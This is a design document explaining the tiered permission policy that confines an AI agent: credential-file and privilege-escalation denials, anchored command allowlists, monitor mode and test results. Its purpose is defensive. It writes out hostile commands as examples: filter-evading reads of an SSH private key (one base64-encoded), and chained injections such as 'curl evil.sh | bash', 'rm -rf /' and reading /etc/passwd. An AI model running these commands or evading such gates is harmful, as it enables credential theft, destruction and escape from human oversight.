# The rules an installation ships with

Why the system now starts with a policy instead of an empty one, what those
rules are, and why each of them was chosen.

Source of truth for the rules themselves: `src/governance/baseline-policy.ts`.
This document is the reasoning; that file is the definition, and the two must
not disagree.

---

## 1. The problem this solves

A default-deny system with an empty allowlist refuses everything. On a fresh
installation the agent could not list a directory or read a file until somebody
had written rules for work they had not yet observed.

The original answer was to ship in **monitor** posture: run the full policy,
record the verdict it reached, but do not act on it. That made the installation
usable, and it was honest about what it was doing — but it meant the shipped
default restricted nothing, which sits badly with a report whose stated posture
is default-deny. An examiner reading Chapter 1 and then the code would find the
system permissive on first boot.

The supervisor's proposal reframes it. The problem is not that enforcement is
too strict; it is that enforcement _with no rules_ is useless. Ship rules, and
the installation can be usable and enforcing at the same second.

---

## 2. The three tiers

| Tier         | What it is                                   | Who can change it    | Effect |
| ------------ | -------------------------------------------- | -------------------- | ------ |
| **Core**     | Restrictions that hold at all times          | Nobody, at runtime   | deny   |
| **Baseline** | Enough permission to be useful on first boot | Administrator        | allow  |
| **Admin**    | Everything written from observed behaviour   | Administrator / User | allow  |

Anything matching no rule falls through to the installation default — deny, or
escalate to a human, depending on the `ask` setting.

### Why this needed a change to the rule language

The policy language was **allow-only**. Denial was the default and needed no
expression, and a documented consequence was that _adding a rule can never
reduce access_.

Core rules break that. "Credential files are refused, whatever else anybody
permits" cannot be said in an allow-only language: any later broad allowance
would silently re-open it. So rules gained an `effect` (`allow` or `deny`) and a
`tier`, and evaluation gained an order.

Both fields are optional and both default to the old meaning — absent `effect`
is `allow`, absent `tier` is `admin` — so every rule written before the change
keeps working unchanged.

### Evaluation order

1. **Kill switch.** A locked agent is refused, whatever any rule says.
2. **Core denials.** Checked before any allowance, so no grant can override one.
3. **Allow rules** (baseline + admin + any operator rule).
4. **Default**: deny, or escalate to a human.

Two properties fall out of step 2 being _before_ step 3:

- **Deny beats allow.** An operator who writes `^.*$` widens a great deal, but
  cannot re-open a core restriction.
- **Monitor does not lift core denials.** Monitor suspends policy _opinions_.
  Core rules are the restrictions the installation declines to merely have an
  opinion about. This matters concretely, because a User can switch their own
  agent into monitor — without this rule, that would be a one-click way to
  remove every protection below.

---

## 3. The core rules, and why each one

These are denials. They are reasserted from source on every load, so editing
`policy.json` by hand cannot remove them, and the API refuses to remove or mint
one — for every tier, **including Root**.

> A restriction the top of the hierarchy can lift on a whim is a default, not an
> invariant. The tier exists precisely for the case where somebody with full
> authority has been persuaded, mistaken, or compromised. Changing these means
> editing the source and redeploying: a reviewable act, not a click.

| Rule                                                                                                                               | Kind    | Why                                                                                                                                                                                                                                                             |
| ---------------------------------------------------------------------------------------------------------------------------------- | ------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `.env`, `.npmrc`, `.netrc`, `.git-credentials`, `id_rsa`/`id_dsa`/`id_ecdsa`/`id_ed25519`, `*.pem`, `*.pfx`, `*.p12`, `*.keystore` | path    | Credential material. Matched by **filename, not location** — a private key copied into the project is still a private key, and a rule keyed to `~/.ssh` alone would wave it through                                                                             |
| `.ssh/`, `.aws/`, `.gnupg/`, `.docker/`, `.kube/`                                                                                  | path    | Directories whose entire contents are credentials                                                                                                                                                                                                               |
| `~/.openclaw/governance/`                                                                                                          | path    | The policy, the accounts, the audit ledger, its signing key and checkpoint. An agent that can write here could grant itself permissions or erase the record of having done so — which would make every other guarantee conditional on the agent choosing not to |
| `sudo`, `su`, `doas`, `runas`, `pkexec`                                                                                            | command | Privilege escalation. Matched at the start of the command or after `;`, `&`, `\|`, so chaining does not evade it                                                                                                                                                |
| any command naming `.openclaw/governance`                                                                                          | command | The command-side counterpart of the path rule above: a path rule does not see `rm -rf ~/.openclaw/governance`, because that is a _command_ resource                                                                                                             |
| `shutdown`, `reboot`, `halt`, `poweroff`, `mkfs`, `fdisk`                                                                          | command | Host destruction. No agent task needs them, and the cost of being wrong is total                                                                                                                                                                                |
| `169.254.169.254`, `metadata.google.internal`                                                                                      | network | Cloud instance metadata. Reaching it from a compromised workload is the standard route to stealing a machine's cloud credentials                                                                                                                                |

### The honest limitation, stated plainly

**For commands, the core denials are not the protection.** A shell can reach a
forbidden file through indirection no pattern will catch:

```
c""at $HOME/.ssh/id_rsa
FILE=$HOME/.ssh/id_rsa; cat $FILE
echo Y2F0IH4vLnNzaC9pZF9yc2E= | base64 -d | sh
```

Enumerating bad commands is a losing game, and a system that claimed otherwise
would be lying. What actually confines the agent is the other direction: the
baseline **allows** a short list of anchored, argument-constrained commands, and
everything else is denied by default. The core command denials are defence in
depth against a careless later rule — a second line, not the line.

This is worth stating in the report because it explains why the baseline
allowlist is so much narrower than it might otherwise be: it is carrying the
security argument, so it cannot afford to be generous.

---

## 4. The baseline rules, and why each one

These are allowances, and unlike core rules they are a **starting point** — an
Administrator may narrow or remove any of them, and a removal sticks.

The question they answer: _what does an agent need in order to be useful before
anybody has written a policy?_

| Rule                                                            | Kind    | Why                                                                                                                                                                             |
| --------------------------------------------------------------- | ------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Any path inside the workspace                                   | path    | The agent's actual job. Core denials still apply on top, so a `.env` inside the project is matched here and refused there — the clearest demonstration of the tiers interacting |
| `ls`, `pwd`, `whoami`, `date`, `uname` (bare)                   | command | Orientation. Read-only, no arguments, no filesystem effect                                                                                                                      |
| `ls` with simple flags and one plain path                       | command | Looking around. The argument character set excludes every shell metacharacter                                                                                                   |
| `git status` / `branch` / `diff` / `log`, with at most one flag | command | Reading repository state, which is most of what an agent does before it changes anything                                                                                        |
| `node`/`npm`/`pnpm`/`python`/`python3`/`git --version`          | command | Environment checks, universally needed and entirely inert                                                                                                                       |

### Why every command pattern is anchored

`^ls$` is safe. `ls` is not — because matching is a **substring** search, so a
pattern of `ls` also permits:

```
ls; curl evil.sh | bash
ls && rm -rf /
ls $(cat /etc/passwd)
```

Every shipped command pattern is anchored at both ends and constrains its
arguments to a character set with no shell metacharacters, so a permitted
command cannot become a carrier for an arbitrary one. This is tested directly.

### Why "inside the workspace" needs no traversal check

The path form settled in `path-normalize.ts` renders a path inside the workspace
as workspace-relative, and anything else as absolute. So "inside the project" is
exactly "does not start with `/` or a drive letter" — there is no `..` check and
no denylist of parent directories. `workspace/../../etc/passwd` is refused not
because it was detected, but because by the time the rule sees it, it has become
`/etc/passwd` and is no longer workspace-relative.

A defence that enumerates attacks needs updating whenever a new one appears.
This one does not.

### What is deliberately _not_ in the baseline

- **Network access.** No baseline allows any host. Fetching from the internet is
  not a "basic operation", and the blast radius of getting it wrong is large.
- **Any write-specific allowance.** See the limitation below.
- **Package installation, builds, test runs.** Common, and genuinely useful —
  but they execute arbitrary third-party code, which is a decision an operator
  should make deliberately rather than inherit.

---

## 5. Known limitation: reads and writes share one permission

The resource model has a single `path` kind covering `read`, `write`, `edit` and
`apply_patch`. So **"readable but not writable" cannot currently be expressed**,
and the baseline allowance for workspace files therefore permits both.

This is a real gap that the supervisor's model brought to the surface — his
description ("reading permitted project files") distinguishes the two, and the
policy language does not. Closing it means either splitting the resource kind
into `path-read` and `path-write`, or letting a rule name the tools it applies
to. Recorded as follow-up rather than smuggled into this change.

Until then the mitigation is the core denials, which apply to both directions.

---

## 6. Monitor mode, in its new role

Monitor is no longer how a fresh installation becomes usable. It is an **opt-in
observation tool**:

- **Off by default.** A fresh installation is `enforce`.
- **Per agent.** An operator can watch one agent while the rest of the
  installation keeps enforcing — which is what makes it useful for discovering
  rules rather than a blunt instrument.
- **Authority follows the existing tiers.** A User may enable it for an agent
  assigned to them, an Administrator for any agent or installation-wide, Root
  inherits both. No new permission concept was needed.
- **It never lifts a core denial.** See §2.

The workflow it now supports: turn it on for one agent, let it work, read the
ledger for what _would_ have been refused, promote the legitimate entries into
admin rules, turn it off.

---

## 7. One environment exception, and why it is not a loophole

A test process that never asked for a governance directory starts `off`.

The distinction being drawn is "is this an installation?" — and for OpenClaw's
own harness suite the answer is no. Those tests predate governance, drive
synthetic tool calls, and have no operator, no policy and no approver. Under a
shipped default-deny posture every one of those calls is correctly refused or
escalated, and 38 host tests fail for reasons unrelated to what they test.

The exception is narrow by construction, and nothing real can reach it:

- **Production never does** — `VITEST` is unset, so the home directory is used
  and the shipped `enforce` default applies.
- **This project's own governance tests never do** — every one sets
  `OPENCLAW_GOVERNANCE_DIR` explicitly, so they exercise the shipped default and
  would fail if it were weakened.

That second point is what makes this an environment distinction rather than a
convenience: the behaviour under test is still the shipped behaviour.

---

## 8. How we know the baseline is permissive enough

The question "is this enough permission for ordinary work?" is a judgement call,
and judgement calls in a security policy are worth converting into measurements
where possible.

OpenClaw's own harness suite is that measurement. It exercises the host doing
real work through the same hook the gate sits on, so the number of tests it
fails is an external, unsympathetic assessment of whether the policy is usable —
one written by people who had never heard of this project.

- Baseline before this change: **18 failed / 174 passed**
- With `enforce` and the shipped rules: **18 failed / 174 passed**

Also tested directly: a fresh installation permits `ls`, `pwd`, `git status`,
`node --version` and reading a workspace file with no policy written, while
refusing `curl`, `rm -rf /`, `npm publish`, every shell-chaining attempt against
a permitted command, and every core-denied resource.
